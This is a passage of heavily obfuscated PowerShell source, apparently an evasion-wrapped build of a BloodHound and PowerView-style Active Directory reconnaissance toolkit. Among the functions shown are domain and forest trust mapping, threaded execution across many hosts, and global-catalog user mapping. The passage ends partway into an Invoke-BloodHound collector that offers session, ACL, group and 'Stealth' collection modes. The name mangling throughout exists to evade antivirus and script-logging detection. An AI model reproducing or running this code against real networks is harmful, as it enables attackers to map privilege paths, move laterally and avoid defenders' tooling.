                            ${DOM`AI`N`TrUSt} | &("{1}{2}{0}{3}" -f'd-Memb','A','d','er') ("{0}{2}{1}"-f'No','perty','tepro') ("{3}{0}{1}{2}" -f'stA','tt','ributes','Tru') ${I`NFO}."tR`UsTa`TtRI`BUTES"
                            ${dO`MA`INtruST} | &("{0}{2}{1}"-f'A','d-Member','d') ("{1}{0}{2}{3}" -f 'ro','Notep','pe','rty') ("{0}{1}" -f 'Domai','nSid') ${sid`StrI`Ng}
                            ${do`M`AIntRuST} | &("{0}{1}{2}" -f'A','dd-Membe','r') ("{2}{0}{1}"-f'pert','y','Notepro') ("{2}{0}{3}{1}" -f'omain','uid','D','G') ${i`NFo}."d`om`AiNg`UiD"
                            ${d`o`M`AiNtRust}."PS`obj`ecT"."t`YPEnAM`eS".("{1}{0}" -f'd','Ad').Invoke(("{4}{3}{6}{5}{1}{0}{2}"-f'Tr','n','ust','e','Pow','APIDomai','rView.'))
                            ${d`omAIN`TrUST}
                        }
                    }
                    
                    ${N`ULL} = ${n`ETaPI`32}::("{1}{3}{0}{2}" -f 'uf','NetA','ferFree','piB').Invoke(${pTRIN`Fo})
                }
                else {
                    &("{0}{1}{3}{4}{2}"-f'Wr','i','e','te-Ve','rbos') "Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                &("{0}{3}{2}{1}" -f'Write-','se','bo','Ver') ('C'+'o'+'uld '+'no'+'t '+'ret'+'rie'+'ve '+'doma'+'in'+' '+'contro'+'l'+'ler '+'f'+'or '+"$Domain")
            }
        }
        else {
            
            ${F`OUnddO`MaIn} = &("{2}{3}{1}{0}" -f 'main','tDo','Ge','t-Ne') -Domain ${DOM`AiN} -Credential ${c`ReD`ENtiaL}
            if(${F`Oundd`OmA`IN}) {
                ${fouN`DdoM`AiN}.("{3}{1}{2}{0}{4}" -f 's','tRela','tion','GetAllTrus','hips').Invoke() | &("{3}{0}{2}{1}" -f 'h-Obje','t','c','ForEac') {
                    ${_}."ps`Obje`Ct"."tYpEna`Mes".("{0}{1}" -f 'Ad','d').Invoke(("{6}{4}{2}{3}{5}{1}{0}" -f 'inTrust','oma','werVie','w','o','.D','P'))
                    ${_}
                }
            }
        }
    }
}


function G`eT-N`et`ForesttRUst {


    [CmdletBinding()]
    param(
        [Parameter(poSition=0,VAluefRompiPEliNE=${T`RUE})]
        [String]
        ${fO`R`eSt},

        [Management.Automation.PSCredential]
        ${c`RED`EntIaL}
    )

    process {
        ${fo`UND`FOreSt} = &("{0}{1}{3}{2}" -f 'Get-NetFo','r','st','e') -Forest ${for`ESt} -Credential ${Cr`Ede`NtiaL}

        if(${F`OunDFO`R`est}) {
            ${FOU`NDF`or`ESt}.("{2}{4}{1}{0}{3}" -f 'hip','elations','GetA','s','llTrustR').Invoke() | &("{0}{2}{1}" -f'ForEach-O','t','bjec') {
                ${_}."PSOB`j`eCT"."T`YpE`NAMEs".("{0}{1}"-f'A','dd').Invoke(("{4}{0}{2}{3}{1}{5}"-f'Vi','.ForestTru','e','w','Power','st'))
                ${_}
            }
        }
    }
}


function iNvo`ke`-Mapdo`m`AiNTrusT {

    [CmdletBinding()]
    param(
        [Switch]
        ${L`daP},

        [String]
        ${dOMaIN`Co`NTRo`lLEr},

        [ValidateRange(1,10000)]
        [Int]
        ${PaGE`S`IZe} = 200,

        [Management.Automation.PSCredential]
        ${C`RE`dentiAl}
    )

    
    ${sEenDO`M`Ains} = @{}

    
    ${D`O`MaINs} = &("{2}{1}{0}" -f'ject','b','New-O') ("{1}{4}{0}{3}{2}" -f'em.Co','S','Stack','llections.','yst')

    
    ${cU`RREntDO`MaIN} = (&("{0}{1}{2}{3}" -f 'G','et-N','etDomai','n') -Credential ${CrEd`EN`TiaL})."na`mE"
    ${do`MaInS}.("{1}{0}"-f'sh','pu').Invoke(${cuR`R`En`T`DoMAIn})

    while(${D`o`MaIns}."COu`Nt" -ne 0) {

        ${DoMA`IN} = ${d`oM`AIns}.("{1}{0}" -f 'p','Po').Invoke()

        
        if (${dOm`AIN} -and (${dOMa`iN}.("{0}{1}" -f'Tri','m').Invoke() -ne "") -and (-not ${Se`en`DOMAiNs}.("{3}{1}{2}{0}"-f'nsKey','nt','ai','Co').Invoke(${DO`M`Ain}))) {

            &("{2}{0}{3}{1}"-f 'i','-Verbose','Wr','te') ('E'+'numer'+'ating'+' '+'tru'+'st'+'s '+'for'+' '+'doma'+'in'+' '+"'$Domain'")

            
            ${N`ULl} = ${seeN`Do`MAi`Ns}.("{1}{0}" -f'd','ad').Invoke(${d`OmaIn}, "")

            try {
                
                if(${L`DAp} -or ${D`OM`AI`NconT`ROLlER}) {
                    ${tru`s`TS} = &("{3}{1}{0}{5}{2}{4}" -f'e','-N','mainTr','Get','ust','tDo') -Domain ${dom`Ain} -LDAP -DomainController ${d`O`MAIn`cOnTrO`lLEr} -PageSize ${PA`GE`sIzE} -Credential ${c`R`e`dEnTIAL}
                }
                else {
                    ${t`RUs`TS} = &("{4}{3}{1}{0}{2}"-f'n','ai','Trust','t-NetDom','Ge') -Domain ${DO`maIN} -PageSize ${p`AG`E`sizE} -Credential ${CrE`D`e`Ntial}
                }

                if(${TruS`TS} -isnot [System.Array]) {
                    ${T`RustS} = @(${Trus`TS})
                }

                
                if(-not (${l`daP} -or ${d`om`AinCoNT`Rol`leR}) ) {
                    ${TrU`STS} += &("{1}{3}{0}{2}"-f'rus','Ge','t','t-NetForestT') -Forest ${DOmA`In} -Credential ${CREDeNT`I`Al}
                }

                if (${TrU`sts}) {
                    if(${TR`UsTS} -isnot [System.Array]) {
                        ${tru`S`Ts} = @(${TrU`S`Ts})
                    }

                    
                    ForEach (${T`R`USt} in ${T`RUSts}) {
                        if(${tRU`ST}."S`o`URcenAMe" -and ${Tr`Ust}."TAR`g`etNaMe") {
                            ${So`UR`cEDOmaIn} = ${tR`U`ST}."s`o`URCEnA`Me"
                            ${t`ArGetDO`M`AiN} = ${T`Rust}."T`Arge`Tna`Me"
                            ${tR`USt`TYPe} = ${T`Ru`St}."Tr`UstT`ypE"
                            ${T`R`U`sTd`IrECtiOn} = ${T`RU`sT}."TrUs`TDIRE`CT`I`on"
                            ${oBJeC`T`Ty`Pe} = ${t`RUSt}."Psob`jecT"."t`Y`pEnAMEs" | &("{1}{0}{2}" -f 'O','Where-','bject') {${_} -match ("{2}{1}{0}" -f 'View','ower','P')} | &("{0}{3}{2}{1}" -f'Sele','ct','je','ct-Ob') -First 1

                            
                            ${Nu`ll} = ${do`M`AiNS}.("{1}{0}" -f'h','Pus').Invoke(${Ta`Rg`e`TDom`AIn})

                            
                            ${dOma`i`Nt`RusT} = &("{2}{0}{1}"-f'Ob','ject','New-') ("{2}{1}{0}"-f 't','jec','PSOb')
                            ${dOMAi`NTRu`ST} | &("{2}{1}{0}" -f'Member','-','Add') ("{1}{2}{0}"-f 'y','Noteproper','t') ("{2}{0}{3}{1}" -f'rce','omain','Sou','D') "$SourceDomain"
                            ${doMAI`N`Tr`USt} | &("{0}{1}{2}"-f'Add-M','emb','er') ("{1}{0}{2}"-f 'r','Noteprope','ty') ("{0}{3}{2}{1}" -f'S','ceSID','ur','o') ${t`Ru`St}."sOU`RCeS`Id"
                            ${DOMAi`NT`R`UsT} | &("{1}{0}{2}" -f '-M','Add','ember') ("{3}{1}{0}{2}" -f 'tepro','o','perty','N') ("{3}{0}{2}{1}" -f'get','in','Doma','Tar') "$TargetDomain"
                            ${DomaIn`T`Ru`sT} | &("{0}{2}{1}"-f'Add-M','ber','em') ("{1}{0}{2}"-f'propert','Note','y') ("{2}{1}{0}" -f 'SID','rget','Ta') ${tr`U`St}."t`ARg`Etsid"
                            ${DO`MaInT`R`UST} | &("{2}{1}{0}" -f'er','emb','Add-M') ("{1}{0}{2}"-f'per','Notepro','ty') ("{1}{0}{2}"-f'ustT','Tr','ype') "$TrustType"
                            ${dO`m`AInT`RUSt} | &("{1}{2}{0}"-f'er','Add','-Memb') ("{2}{1}{0}" -f 'operty','otepr','N') ("{3}{0}{1}{2}"-f 'D','ir','ection','Trust') "$TrustDirection"
                            ${d`o`maINtr`UsT}."p`sO`BJeCt"."tYpE`NAM`Es".("{1}{0}"-f'dd','A').Invoke(${Ob`JE`CtTYpe})
                            ${dO`MaiN`TRu`ST}
                        }
                    }
                }
            }
            catch {
                &("{1}{2}{3}{0}"-f 'ose','Wri','te','-Verb') ('['+'!] '+'Error'+': '+"$_")
            }
        }
    }
}








function neW-`THReADE`DFU`NC`TI`On {
    
    [CmdletBinding()]
    Param(
        [Parameter(POsitIoN = 0, MANDAtORy = ${T`RUe}, VAluefRomPiPeLinE = ${T`Rue}, ValueFrOMpIPelIneByPrOPeRTYnAMe = ${T`RuE})]
        [String[]]
        ${com`pU`TE`RNaMe},

        [Parameter(positIoN = 1, ManDAToRy = ${Tr`Ue})]
        [System.Management.Automation.ScriptBlock]
        ${sC`RIptBLO`Ck},

        [Parameter(POsitIOn = 2)]
        [Hashtable]
        ${SC`Ri`p`TpaRAm`ete`Rs},

        [Int]
        [ValidateRange(1,  100)]
        ${T`hrEAds} = 20,

        [Switch]
        ${N`OIMpor`TS}
    )

    BEGIN {
        
        
        ${S`e`SsionsTA`TE} =   ( &("{3}{0}{2}{1}"-f 'H','eM','ILDIT','geT-c') ('VA'+'rIAble'+':nG8U7')  )."VAL`Ue"::("{1}{2}{4}{3}{0}"-f't','Cr','e','efaul','ateD').Invoke()
        ${S`e`SSION`staTE}."APAR`TmENTSTa`TE" =   ${W9`G7}::"C`UrrEN`T`ThReAD".("{2}{3}{0}{1}" -f 'Stat','e','G','etApartment').Invoke()

        
        
        if (-not ${n`oI`M`PORTs}) {
            
            ${m`yvArS} = &("{1}{0}{3}{2}"-f'e','G','ariable','t-V') -Scope 2

            
            ${V`OrbiDDe`N`VArs} = @('?',("{0}{1}" -f 'ar','gs'),("{3}{1}{2}{0}"-f'e','soleFil','eNam','Con'),("{0}{1}"-f 'Er','ror'),("{2}{1}{0}" -f'Context','ecution','Ex'),("{0}{1}" -f 'f','alse'),("{0}{1}"-f'H','OME'),("{0}{1}" -f'Hos','t'),("{1}{0}" -f 'nput','i'),("{2}{1}{0}" -f'ect','Obj','Input'),("{1}{3}{2}{0}" -f't','Maximum','n','AliasCou'),("{0}{1}{3}{2}"-f'Ma','ximum','veCount','Dri'),("{2}{4}{1}{5}{3}{0}" -f 't','o','MaximumEr','n','r','rCou'),("{2}{1}{4}{3}{0}"-f'nt','axi','M','onCou','mumFuncti'),("{1}{3}{0}{5}{4}{2}"-f'u','M','ount','axim','ryC','mHisto'),("{3}{5}{4}{2}{0}{1}" -f'oun','t','eC','Maxim','iabl','umVar'),("{1}{0}{3}{2}"-f 'yInv','M','ation','oc'),("{1}{0}"-f 'l','nul'),'PID',("{2}{0}{3}{4}{1}{5}"-f'd','et','PSBoun','Para','m','ers'),("{0}{3}{2}{1}" -f'P','ath','ommandP','SC'),("{0}{2}{1}"-f 'PSC','ture','ul'),("{4}{1}{5}{2}{0}{3}" -f'Va','ef','r','lues','PSD','aultParamete'),("{1}{0}"-f'ME','PSHO'),("{0}{3}{1}{2}"-f 'P','Ro','ot','SScript'),("{0}{1}{2}"-f 'PSU','IC','ulture'),("{1}{3}{2}{0}"-f'le','P','nTab','SVersio'),'PWD',("{2}{0}{1}"-f'el','lId','Sh'),("{1}{3}{0}{2}" -f 'n','S','izedHash','ynchro'),("{1}{0}" -f 'rue','t'))

            
            ForEach (${v`Ar} in ${myva`RS}) {
                if (${v`oRBiDD`E`NVA`Rs} -NotContains ${V`Ar}."Na`me") {
                ${SEsS`IONst`ATe}."V`ARIAB`lEs".("{0}{1}"-f 'Ad','d').Invoke((&("{0}{2}{1}" -f 'New-O','t','bjec') -TypeName ("{10}{5}{1}{7}{8}{0}{9}{2}{6}{4}{3}" -f'paces.Ses','ati','eVari','ry','nt','gement.Autom','ableE','on','.Runs','sionStat','System.Mana') -ArgumentList ${v`AR}."nA`ME",${V`Ar}."VAl`Ue",${V`Ar}."dEsCRI`pti`oN",${V`Ar}."O`PTIons",${V`Ar}."aTTR`ibU`TES"))
                }
            }

            
            ForEach (${fUnCT`I`oN} in (&("{1}{4}{0}{3}{2}" -f '-ChildI','Ge','m','te','t') ("{1}{0}" -f 'n:','Functio'))) {
                ${se`SSIoN`sTatE}."COm`MaN`Ds".("{0}{1}" -f'A','dd').Invoke((&("{1}{0}{2}" -f'w-','Ne','Object') -TypeName ("{2}{5}{12}{6}{4}{11}{3}{10}{1}{7}{14}{8}{9}{13}{0}"-f'try','ionState','Syste','es.','R','m.Management.Aut','tion.','F','t','i','Sess','unspac','oma','onEn','unc') -ArgumentList ${f`UNc`TIOn}."n`AMe", ${f`UNcT`ion}."dEFin`itI`on"))
            }
        }

        
        
        

        
        ${pO`ol} =   ${iK0f}::("{1}{4}{0}{2}{3}"-f 'e','C','Runspace','Pool','reat').Invoke(1, ${t`hReAds}, ${Se`sSI`On`sT`AtE}, ${hO`St})
        ${p`ooL}.("{1}{0}"-f'en','Op').Invoke()

        
        ${met`HoD} = ${n`ULL}
        ForEach (${M} in  ${ol`NQ}.("{1}{2}{0}"-f'Methods','G','et').Invoke() | &("{1}{2}{0}{3}" -f '-Ob','W','here','ject') { ${_}."n`AMe" -eq ("{1}{0}{2}" -f 'Invok','Begin','e') }) {
            ${meTHOdp`A`Ra`ME`TERs} = ${M}.("{0}{2}{1}"-f 'GetPa','meters','ra').Invoke()
            if ((${Me`ThO`DPaR`AM`ETERS}."C`Ount" -eq 2) -and ${M`ETHo`D`pAram`eTe`Rs}[0]."N`AMe" -eq ("{0}{1}" -f'i','nput') -and ${M`eThODPARA`ME`TeRS}[1]."N`AME" -eq ("{1}{0}"-f 'utput','o')) {
                ${mE`Thod} = ${M}."mA`KEge`NerI`Cm`eThOd"([Object], [Object])
                break
            }
        }

        ${j`obS} = @()
        ${cOM`PUte`R`NaMe} = ${cO`MPuT`E`RN`AME} | &("{2}{0}{1}" -f 'ec','t','Where-Obj') { ${_} -and (${_} -ne '') }
        &("{1}{2}{0}{3}" -f'te-Ve','Wr','i','rbose') "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count) "

        
        if (${tHR`EaDS} -ge ${cOmpU`TEr`NA`me}."LeN`GTH") {
            ${T`hR`EADS} = ${cOMpuTE`Rn`AMe}."l`En`gTh"
        }
        ${eLE`m`En`Ts`plITSizE} = [Int](${C`OmP`UTeRnAME}."l`EnGth"/${t`HRe`Ads})
        ${cOm`putERnA`mePA`R`T`I`TIONEd} = @()
        ${S`TA`RT} = 0
        ${e`ND} = ${elE`MEN`TSpLi`TSiZE}

        for(${I} = 1; ${I} -le ${T`H`REAds}; ${I}++) {
            ${l`ISt} = &("{1}{0}{2}" -f'Obj','New-','ect') ("{0}{3}{4}{7}{2}{8}{6}{5}{1}"-f 'Sys','t','.','tem.Col','l','s','rrayLi','ections','A')
            if (${I} -eq ${T`hrEads}) {
                ${e`Nd} = ${Co`MpU`TeRna`Me}."L`eNgth"
            }
            ${lI`St}."A`DDrA`NGE"(${C`oMpUt`ern`AME}[${ST`Art}..(${E`ND}-1)])
            ${S`T`ART} += ${ELemENt`spL`I`TsiZE}
            ${e`ND} += ${Ele`MeNTSPLi`Ts`I`ZE}
            ${comPut`ERNaMEp`A`R`TITionED} += @(,@(${l`IsT}.("{2}{0}{1}" -f 'o','Array','T').Invoke()))
        }

        &("{1}{4}{3}{0}{2}" -f 'V','W','erbose','ite-','r') ('['+'Ne'+'w'+'-Threade'+'dFunc'+'tion] '+'Tot'+'al'+' '+'n'+'um'+'ber '+'of'+' '+'thre'+'a'+'ds/part'+'it'+'ions: '+"$Threads")

        ForEach (${Co`Mp`U`Terna`M`e`partitioN} in ${c`oM`p`UTeRnaM`ePA`RTiTIon`ED}) {
            
            ${pOwe`RSH`ell} =  ${O`lNq}::("{0}{1}{2}"-f'Crea','t','e').Invoke()
            ${p`OWeR`sHELL}."Ru`NSPA`CEP`oOL" = ${P`ooL}

            
            ${Nu`Ll} = ${powe`R`SHell}.("{0}{1}{2}"-f 'AddS','crip','t').Invoke(${s`cRiPT`B`locK}).("{3}{1}{2}{0}" -f 'ameter','ddPa','r','A').Invoke(("{2}{3}{0}{1}" -f'r','Name','C','ompute'), ${co`MPuTerNA`mE`PAR`Tit`iON})
            if (${scrI`PTPAR`AmETE`Rs}) {
                ForEach (${p`ARaM} in ${Sc`R`IPT`paRA`m`ETERS}.("{3}{2}{0}{1}"-f 't','or','numera','GetE').Invoke()) {
                    ${n`Ull} = ${P`Ower`s`HELl}.("{2}{1}{3}{0}"-f'ter','d','Ad','Parame').Invoke(${P`AR`AM}."N`AmE", ${p`Ar`Am}."VAl`Ue")
                }
            }

            
            ${oUt`pUt} = &("{1}{2}{3}{0}"-f't','New','-','Objec') ("{7}{0}{10}{8}{12}{4}{5}{9}{6}{2}{3}{1}{11}" -f'a','bj','ection','[O','.PSDat','a','ll','M','ment.Aut','Co','nage','ect]','omation')

            
            ${Jo`BS} += @{
                ('PS') = ${P`OWErsHe`Ll}
                ("{2}{0}{1}" -f'p','ut','Out') = ${oU`Tput}
                ("{0}{1}{2}"-f 'Re','su','lt') = ${ME`T`Hod}."iNv`okE"(${poW`Ershe`Ll}, @(${n`ULl}, [Management.Automation.PSDataCollection[Object]]${Ou`T`PUT}))
            }
        }
    }

    END {
        &("{3}{2}{0}{1}{4}"-f 'e','-Ver','it','Wr','bose') ("{4}{1}{3}{6}{2}{0}{5}"-f 'n] Threads exec','N','edFunctio','ew-Thre','[','uting','ad')
        
        
        Do {
            ForEach (${J`oB} in ${JO`BS}) {
                ${J`Ob}."OUtp`Ut".("{1}{2}{0}"-f 'All','R','ead').Invoke()
            }
            &("{2}{1}{0}{3}"-f'S','t-','Star','leep') -Seconds 1
        }
        While ((${j`obS} | &("{2}{0}{1}"-f're','-Object','Whe') { -not ${_}."r`eS`UlT"."IsCOM`p`LE`Ted" })."Cou`NT" -gt 0)
        &("{1}{2}{0}"-f '-Verbose','Wri','te') ("{10}{17}{1}{11}{2}{14}{5}{16}{7}{9}{12}{15}{4}{8}{0}{3}{13}{6}"-f'ean','n','ti','up','fina','i','.','0 s','l cl','econ','[New-ThreadedF','c','ds fo','..','on] Wa','r ','ting 12','u')
        &("{2}{1}{0}"-f'art-Sleep','t','S') -Seconds 120

        
        ForEach (${j`ob} in ${j`Obs}) {
            ${J`OB}."ou`TpUt".("{1}{2}{0}"-f 'll','Re','adA').Invoke()
            ${j`Ob}."p`S".("{1}{0}"-f 'se','Dispo').Invoke()
        }

        ${Po`ol}.("{1}{2}{0}"-f 'se','D','ispo').Invoke()
        &("{1}{2}{3}{4}{0}" -f 'ose','Wr','i','te-Ve','rb') ("{9}{0}{2}{3}{4}{5}{7}{1}{6}{10}{8}" -f 'ew-Thr','th','eadedFunct','i','o','n','read','] all ','ed','[N','s complet')
    }
}


function G`ET-Gl`OBA`lcA`TaLo`GUS`E`RMAPPiNg {

    [CmdletBinding()]
    param(
        [ValidatePattern({"{1}{0}" -f '//','^GC:'})]
        [String]
        ${gLoBal`Ca`T`ALOG}
    )

    if(-not ${PSboUndPa`R`AM`ETERs}[("{2}{3}{1}{0}{4}"-f'l','alCata','G','lob','og')]) {
        ${gC`Pa`Th} = ([ADSI]("{1}{4}{3}{2}{0}" -f'E','LDAP:','DS','ot','//Ro'))."dNSHo`StN`A`me"
        ${aDS`PA`TH} = "GC://$GCPath"
        &("{1}{0}{2}{3}"-f'e','Write-V','rb','ose') ('E'+'numerat'+'ed '+'gl'+'obal '+'cat'+'alo'+'g '+'loc'+'atio'+'n: '+"$ADSPath")
    }
    else {
        ${aDs`PATh} = ${gLo`B`ALC`ATaloG}
    }

    ${user`DOM`AInm`ApPinGS} = @{}

    ${U`SeRsE`ARcHEr} = &("{3}{2}{0}{4}{1}" -f'nSe','her','Domai','Get-','arc') -ADSpath ${AD`sPA`Th}
    ${uSeRseA`RC`h`Er}."F`iLt`ER" = ("{0}{5}{3}{2}{1}{6}{4}"-f'(samA','=805306','tType','oun','68)','cc','3')
    ${uS`ERsEar`cheR}."PR`o`pEr`TiEsToLOAd".("{0}{2}{1}" -f 'AddRa','ge','n').Invoke((("{1}{0}{2}" -f 'macco','sa','untname'),("{0}{1}{3}{2}"-f'disting','uish','name','ed'), 'cn', ("{2}{3}{0}{1}"-f 'ct','sid','obj','e')))

    ForEach(${u`sEr} in ${USE`RSeAr`cH`er}.("{0}{1}" -f 'Find','All').Invoke()) {
        ${uSe`RNaME} = ${U`SeR}."Pr`o`peRTiEs"[("{0}{2}{3}{4}{1}" -f 'samac','e','c','ou','ntnam')][0].("{1}{2}{0}"-f 'r','T','oUppe').Invoke()
        ${US`ERdN} = ${U`ser}."PRO`Perti`es"[("{0}{3}{2}{5}{4}{1}" -f'd','name','stin','i','ed','guish')][0]

        if(${UsER`DN} -and (${U`se`RdN} -ne '')) {
            if ((${U`SE`RDn} -match ("{5}{0}{1}{4}{2}{3}"-f'eig','nSecurityPri','a','ls','ncip','For')) -and (${useR`Dn} -match ("{0}{1}"-f 'S-1-5-','21'))) {
                try {
                    if(-not ${m`Em`BErsid}) {
                        ${Me`MBe`RsiD} = ${U`SER}."pRO`PE`RtIeS"['cn'][0]
                    }
                    ${uSe`RS`iD} = (&("{0}{2}{1}"-f'New-','ject','Ob') ("{4}{7}{9}{12}{5}{2}{3}{6}{0}{10}{13}{11}{1}{8}"-f 'ity','e','y.Principal.','S','S','curit','ecur','yst','r','em.','Ide','ifi','Se','nt')(${u`seR}."P`Ro`per`TiES"[("{1}{0}"-f'jectsid','ob')][0],0))."v`AlUe"
                    ${meMBErsI`Mpl`e`Na`Me} = &("{1}{2}{0}{3}"-f 'rt-SidToNa','Con','ve','me') -SID ${us`eR`SId} | &("{3}{0}{1}{2}"-f 't-AD','Nam','e','Conver') -InputType 'NT4' -OutputType ("{1}{0}{2}" -f'a','C','nonical')
                    if(${ME`mb`ErsIMp`lenAMe}) {
                        ${U`sER`Domain} = ${me`MbeRSiMp`LeNA`mE}.("{1}{0}" -f 't','Spli').Invoke('/')[0]
                    }
                    else {
                        &("{0}{2}{1}{3}"-f'W','t','ri','e-Verbose') ('Er'+'ror '+'con'+'verti'+'ng '+"$UserDN")
                        ${US`ERd`Om`AIN} = ${NU`lL}
                    }
                }
                catch {
                    &("{1}{2}{3}{0}" -f'rbose','Wr','ite-V','e') ('Er'+'ror '+'conve'+'rti'+'ng'+' '+"$UserDN")
                    ${Us`ErD`OmAiN} = ${N`ULL}
                }
            }
            else {
                
                ${usERD`O`m`AIN} = (${USE`R`DN}.("{1}{2}{0}" -f'g','sub','Strin').Invoke(${us`e`Rdn}.("{1}{0}" -f'dexOf','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.').("{0}{1}"-f'ToUppe','r').Invoke()
            }
            if(${u`s`Erd`OmAiN}) {
                if(-not ${U`sErDom`A`iN`M`AppinGS}[${uSeRna`ME}]) {
                    ${u`s`ERdOmAInmAp`P`I`NGs}[${Use`Rn`AMe}] = @(${USE`R`DOmA`IN})
                }
                elseif(${US`e`RDOmA`iNMApP`iNgS}[${use`Rna`mE}] -notcontains ${uS`eRdom`AiN}) {
                    ${USERdO`mai`N`Mapp`INgs}[${U`SERn`Ame}] += ${uS`e`RDoMAiN}
                }
            }
        }
    }

    ${uSer`SEaRch`ER}.("{1}{0}" -f'se','dispo').Invoke()
    ${U`seRdo`mai`NMA`pPINGs}
}


function in`Vo`kE-BlOODHo`UND {


    [CmdletBinding(defAultParAmETErSeTnAMe = {"{1}{2}{0}"-f't','CSV','Expor'})]
    param(
        [Parameter(vALuEfRoMPipelinE=${Tr`Ue})]
        [Alias({"{1}{0}" -f'ostName','H'})]
        [String[]]
        [ValidateNotNullOrEmpty()]
        ${c`oMpUT`E`RNAMe},

        [String]
        ${cOmPUt`eR`Ad`S`p`Ath},

        [String]
        ${U`S`ERA`dsPath},

        [String]
        ${dO`mA`iN},

        [String]
        ${d`OmaiNC`ONt`Rol`LeR},

        [String]
        [ValidateSet({"{0}{1}"-f'Gr','oup'}, {"{0}{1}"-f'A','CLs'}, {"{0}{2}{3}{1}"-f 'C','ly','om','puterOn'}, {"{1}{2}{0}" -f 'p','Lo','calGrou'}, {"{4}{3}{2}{1}{0}"-f'up','o','calGr','o','GPOL'}, {"{2}{1}{0}"-f'on','i','Sess'}, {"{0}{1}{2}" -f'L','og','gedOn'}, {"{1}{0}{2}"-f't','Steal','h'}, {"{2}{0}{1}" -f 'r','usts','T'}, {"{0}{1}{2}" -f'Def','aul','t'})]
        ${c`o`LLeCTiOnm`e`T`hod} = ("{1}{0}{2}" -f'f','De','ault'),

        [Switch]
        ${Se`ArcH`ForE`ST},

        [Parameter(PARamETErsetnAmE = "csv`e`xPO`RT")]
        [ValidateScript({ &("{1}{2}{0}"-f'th','Te','st-Pa') -Path ${_} })]
        [String]
        ${cs`VfO`lder} = $(&("{1}{3}{0}{2}" -f'io','Get-Loca','n','t')),

        [Parameter(PARAmeTeRSEtnaME = "C`S`VExpOrT")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${cS`V`pREf`ix},

        [Parameter(paRAmEtErsETnaMe = "rE`stApi", MAnDAToRy = ${T`RuE})]
        [URI]
        ${u`RI},

        [Parameter(pARametersETNAmE = "rESta`PI", mandatoRY = ${TR`Ue})]
        [String]
        [ValidatePattern({"{1}{0}"-f '.*','.*:'})]
        ${u`SERpass},

        [ValidatePattern({"{0}{1}" -f '^GC','://'})]
        [String]
        ${G`loBAlcAt`A`lOg},

        [Switch]
        ${SK`IPGC`dECOnF`LIC`TiOn},

        [ValidateRange(1,50)]
        [Int]
        ${Thr`EA`ds} = 20,

        [ValidateRange(1,5000)]
        [Int]
        ${tH`Ro`TTlE} = 1000
    )

    BEGIN {

        Switch (${c`ol`lEc`TIOn`m`etHOd}) {
            ("{0}{1}"-f'Gr','oup')         { ${u`S`EGRoUp} = ${Tr`Ue}; ${SKIp`COm`p`UtErENumera`T`ION} = ${Tr`Ue}; ${S`K`i`P`Gcd`EcONflicTio`N2} = ${T`RUE} }
            ("{0}{1}"-f'ACL','s')          { ${u`seGRO`UP} = ${faL`se}; ${Ski`p`Compu`TeRENuMERa`TIoN} = ${T`RUe}; ${Ski`PGc`de`cO`NflIcT`IOn2} = ${tr`UE}; ${uS`E`ACLS} = ${T`RUe} }
            ("{0}{2}{1}{3}" -f 'Com','rO','pute','nly')  { ${uSegrO`UP} = ${fa`LsE}; ${uSELO`Ca`Lg`R`oUp} = ${TR`UE}; ${U`SEseSs`iON} = ${t`RuE}; ${UsELo`gGe`D`ON} = ${tR`Ue}; ${sKipgCD`eCo`NF`lICTIo`N2} = ${F`ALSE} }
            ("{0}{2}{1}" -f'Local','p','Grou')    { ${US`elO`caL`grO`Up} = ${t`RuE}; ${skIpgC`dE`CON`F`l`iCTION2} = ${t`RUe} }
            ("{0}{2}{1}"-f'GPOL','p','ocalGrou') { ${USEgp`ogR`OUp} = ${T`RUE}; ${s`KiP`C`OM`pUT`e`REnuM`EratIoN} = ${t`RUe}; ${s`k`iPG`CD`Ec`onfLIct`iON2} = ${t`RuE} }
            ("{0}{1}{2}"-f 'Ses','s','ion')       { ${USE`SEs`siOn} = ${t`RuE}; ${sKI`PG`c`dEC`oNflICtiO`N2} = ${FaL`SE} }
            ("{0}{2}{1}" -f 'Lo','edOn','gg')      { ${USElO`g`gEdoN} = ${T`RUE}; ${S`KiP`GCd`ECO`N`FLicT`iON2} = ${Tr`Ue} }
            ("{0}{1}" -f'Trust','s')        { ${USED`oMaiNTR`US`Ts} = ${T`RUe}; ${sk`I`pcompU`TereNu`M`eRATion} = ${t`RUE}; ${SKiPG`CDEcO`N`F`licTiO`N2} = ${tr`UE} }
            ("{1}{0}" -f'th','Steal')       {
                ${uSE`G`RoUP} = ${t`Rue}
                ${UsegP`oG`R`OuP} = ${T`RUE}
                ${usE`sE`SSI`On} = ${t`RuE}
                ${USeD`OmaInt`R`UsTS} = ${tr`UE}
                ${ski`pGcDeCON`Fl`i`Ction2} = ${fA`lSe}
            }
            ("{1}{2}{0}"-f 't','Def','aul')       {
                ${UsEg`R`OuP} = ${tR`UE}
                ${U`sELocALg`ROUp} = ${Tr`UE}
                ${use`sesSi`ON} = ${Tr`Ue}
                ${Use`L`oGGeD`On} = ${FaL`sE}
                ${u`S`e`DoMaiNtr`Us`Ts} = ${tr`UE}
                ${Ski`Pg`c`DeConFLIcTION2} = ${fAL`se}
            }
        }

        if(${sk`iPg`CDEcOn`FLIctI`oN}) {
            ${sK`Ipgc`dE`coNFL`iC`TiOn2} = ${TR`UE}
        }

        ${gc`p`ATh} = ([ADSI]("{0}{4}{3}{1}{2}" -f'LDAP:/','DS','E','Root','/'))."DNs`hOStnA`Me"
        ${gCa`DS`P`ATh} = "GC://$GCPath"

        
        
        
        ${Acl`ge`NeraLRigH`TsRE`GeX} = [regex] ((("{9}{7}{12}{4}{3}{2}{8}{11}{6}{5}{0}{1}{10}"-f '8OWriteD','a','OWri','enericWriteB8','cAllB8OG','B','ner','e','te','Gen','cl','Ow','ri'))."reP`lacE"(([cHAR]66+[cHAR]56+[cHAR]79),[StrINg][cHAR]124))

        if (${Ps`c`mDlet}.PAraMeterSeTNaMe -eq ("{2}{0}{1}"-f'SVEx','port','C')) {
            try {
                ${oUT`PuTFo`L`der} = ${c`S`V`FolDeR} | &("{0}{2}{1}" -f'Re','Path','solve-') -ErrorAction ("{0}{1}" -f 'Sto','p') | &("{2}{0}{3}{1}" -f'lect-','t','Se','Objec') -ExpandProperty ("{0}{1}" -f'Pa','th')
            }
            catch {
                throw ('Erro'+'r:'+' '+"$_")
            }

            if(${cS`VPreF`IX}) {
